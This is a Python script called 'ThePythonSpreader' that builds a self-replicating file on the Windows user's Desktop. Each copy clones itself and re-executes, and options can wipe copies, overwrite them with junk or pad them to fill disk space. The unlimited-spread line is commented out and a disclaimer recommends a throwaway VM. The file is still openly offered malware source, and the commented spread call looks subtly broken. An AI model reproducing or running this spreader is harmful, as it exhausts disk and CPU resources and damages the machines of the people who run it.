#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Code by: @53686b (Github/Twitter)
# Version: 1.0.1 (23/03/2021)

"""
ThePythonSpreader is a script that creates files capable of multiplying themselves.
The first file copies itself to a new file, which results of the addition of a random number
to the original file name, and then executes it. Each new file will repeat the same pattern 
indefinetely.
Some customization is allowed through the settings found between lines 40 and 89.
For safety reasons the self-multiplying behavior of each copy is deactivated by default. 
To activate it, check line 172.
Make sure to use it only in a safe environment, such as a disposable Virtual Machine.
*** Full responsibility for any damage caused by this script goes to the user. ***
"""

############################################################################################
######      ##  ##  #######     #      ##      ##      ##     ##      ##      #      #######
######  ###  #  ##  ######   ####  ###  #  ###  #  #####  ###  #  ###  #  #####  ###  ######
######      ###    ########    ##      ##      ##      #       #  ###  #      #      #######
######  ########  ###########   #  ######  ##  ##  #####  ###  #  ###  #  #####  ##  #######
######  ########  ###   ##     ##  ######  ###  #      #  ###  #      ##      #  ###  ######
############################################################################################

import os
from getpass import getuser
from random import randrange

user = getuser()

############################################################################################
##########################            Default Settings            ##########################
############################################################################################

name , safetyDelay , randomRange = 'Spreader' , 1 , 10

# name - Name of the file.
# safetyDelay - Time it takes to create a new file. (float, seconds)
# randomRange - amount of file each new one creates.

############################################################################################

# Choose the directory where you want to create the spreader file. Must be a string.
# (Default = "c:\\Users\\" + user + "\\desktop\\")

targetDirectory = "c:\\Users\\" + user + "\\desktop\\"

############################################################################################
#########################            Advanced Settings            ##########################
############################################################################################

# Choose if you want to create a ReadMe file in the targetted directory.

ReadMe = False
txt = "This is a message"

############################################################################################
######### KeepSelf  0 ### DeleteContent  1 ### TurnIntoGarbage 2 ### DeleteSelf  3 #########
############################################################################################

# Choose from above, the kind of behaviour each file should have after multiplying.

fileLife = 0

############################################################################################
########################################    Size    ########################################
############################################################################################

amountOfGarbage = 1 # (int, kbytes~)
# If you chose the TurnIntoGarbage option.

makeThemExtraHeavy = False
amountOfExtraGarbage = 1 # (int, kbytes~)

# makeThemExtraHeavy - Adds garbage to the files in order to make them heavier.
# This is independent from the TurnIntoGarbage option as it leaves the code alone.

############################################################################################
############################################################################################
############################################################################################

garbage , extraGarbage = "" , ""

if fileLife == 2:
    garbage = """
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################"""

if makeThemExtraHeavy:
    extraGarbage = """
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################
####################################################################################################"""

# Creates the ReadMe file if the option is selected.
if ReadMe:
    read = open(targetDirectory + "README" + ".txt" , "w")
    read.write(txt)
    read.close()

# Creates the first file.
f = open(targetDirectory + name + ".py" , "w")

f.write(
# Adds the configs chosen to the DNA of the the file.
"x = " + "\"" + name + "\"" + "\n"
"y = " + str(safetyDelay) + "\n"
"z = " + str(randomRange) + "\n"
"v = " + str(fileLife) + "\n"
"t = '''" + garbage + "'''\n"

# Adds the reproductive DNA to the file.
"""
import os
from time import sleep
from random import randrange
from shutil import copyfile
i = randrange(z)
nL = len(x)
os.path.basename(__file__)
nNS = (os.path.basename(__file__)[nL:])[:-3] + str(i)
s = __file__
d = os.path.join(os.path.dirname(__file__), x + nNS + '.py')
copyfile(s, d)
sleep(y)
k = []
for g in os.listdir(os.path.abspath(os.path.dirname(__file__))):
    for n in range(0,z):
        if g == (os.path.basename(__file__)[:-3] + str(n) + ".py"):
            k.append(g)
if v == 0 and len(k) == z:
    exec(open(__file__).read())
elif v == 1 and len(k) == z:
    f = open(__file__ , "w")
    f.write("")
    f.close
elif v == 2 and len(k) == z:
    f = open(__file__ , "w")
    f.write(t)
    f.close           
elif v == 3 and len(k) == z:
    os.remove(__file__)
else:
    exec(open(__file__).read())\n"""
############################################################################################
############     The Line Below Will Make The Program Spread Without Limits     ############
############################################################################################
"""    #os.system(os.path.dirname(__file__), name + nNS + '.py')"""
############################################################################################
##########################     !Delete the '#' at own risk!     ############################
############################################################################################

# Makes the file heavier if the option is selected.
+ "\n" + amountOfExtraGarbage * extraGarbage)
f.close()

#This executes the first file.
#os.system(targetDirectory + name + ".py")

############################################################################################
############################################################################################
############################################################################################
